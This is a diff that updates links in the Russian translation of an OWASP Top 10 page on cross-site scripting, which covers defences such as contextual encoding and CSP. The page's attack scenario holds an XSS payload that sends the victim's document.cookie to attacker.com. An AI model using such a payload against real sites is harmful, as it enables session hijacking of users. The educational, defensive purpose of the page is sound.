@@ -20,8 +20,8 @@
 Для предотвращения XSS необходимо отделять непроверенные данные от активного контента браузера. Этого можно достичь следующими способами:
 
 * Использовать фреймворки с автоматическим преобразованием данных, как в последних версиях Ruby on Rails и React JS. Необходимо также проанализировать ограничения XSS-защиты каждого фреймворка и обеспечить соответствующую обработку этих исключений.
-* Преобразовывать недоверенные данные из HTTP-запросов, основываясь на контексте, в HTML-коде (теле, атрибутах, JavaScript, CSS или URL) для предотвращения отраженного XSS и межсайтового выполнения хранимых сценариев. ["Памятка OWASP: Предотвращение XSS"](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet) содержит подробные инструкции по преобразованию данных.
-* Применять контекстное кодирование при изменении документа в браузере пользователя для предотвращения XSS на основе DOM. Если это невозможно, то применять контекстное кодирование к API браузера (см. ["Памятку OWASP: Предотвращение XSS на основе DOM"](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet)).
+* Преобразовывать недоверенные данные из HTTP-запросов, основываясь на контексте, в HTML-коде (теле, атрибутах, JavaScript, CSS или URL) для предотвращения отраженного XSS и межсайтового выполнения хранимых сценариев. ["Памятка OWASP: Предотвращение XSS"](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) содержит подробные инструкции по преобразованию данных.
+* Применять контекстное кодирование при изменении документа в браузере пользователя для предотвращения XSS на основе DOM. Если это невозможно, то применять контекстное кодирование к API браузера (см. ["Памятку OWASP: Предотвращение XSS на основе DOM"](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)).
 * Использовать [политику защиты содержимого (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) для предотвращения XSS. Эта мера эффективна, если отсутствуют уязвимости, позволяющие внедрить код через локальные файлы (напр., используя подмену путей или уязвимые библиотеки из разрешенных сетей доставки контента).
 
 ## Примеры сценариев атак
@@ -34,7 +34,7 @@
 Злоумышленник меняет параметр 'CC' в браузере на:
 
 ```
-'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'
+'><script>document.location='https://attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'
 ```
 
 Идентификатор сессии жертвы отправляется на сайт злоумышленника, позволяя атакующему перехватить текущую сессию пользователя.
@@ -45,16 +45,16 @@
 
 ### OWASP
 
-* [Проактивная защита OWASP: Кодирование данных](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)
-* [Проактивная защита OWASP: Проверка данных](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)
-* [Стандарт подтверждения безопасности приложений OWASP: V5](https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project)
-* [Руководство OWASP по тестированию: Отраженное межсайтовое выполнение сценариев](https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001))
-* [Руководство OWASP по тестированию: Межсайтовое выполнение хранимых сценариев](https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002))
-* [Руководство OWASP по тестированию: XSS на основе объектной модели документа](https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001))
-* [Памятка OWASP: Предотвращение XSS](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
-* [Памятка OWASP: Предотвращение XSS на основе DOM](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet)
-* [Памятка OWASP: Обход фильтра XSS](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
-* [Проект кодировщика Java от OWASP](https://www.owasp.org/index.php/OWASP_Java_Encoder_Project)
+* [Проактивная защита OWASP: Кодирование данных](https://owasp.org/www-project-proactive-controls/v3/en/c4-encode-escape-data)
+* [Проактивная защита OWASP: Проверка данных](https://owasp.org/www-project-proactive-controls/v3/en/c4-encode-escape-data)
+* [Стандарт подтверждения безопасности приложений OWASP: V5](https://owasp.org/www-project-application-security-verification-standard/)
+* [Руководство OWASP по тестированию: Отраженное межсайтовое выполнение сценариев](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting)
+* [Руководство OWASP по тестированию: Межсайтовое выполнение хранимых сценариев](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting)
+* [Руководство OWASP по тестированию: XSS на основе объектной модели документа](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting)
+* [Памятка OWASP: Предотвращение XSS](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+* [Памятка OWASP: Предотвращение XSS на основе DOM](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
+* [Памятка OWASP: Обход фильтра XSS](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
+* [Проект кодировщика Java от OWASP](https://owasp.org/www-project-java-encoder/)
 
 ### Сторонние
 
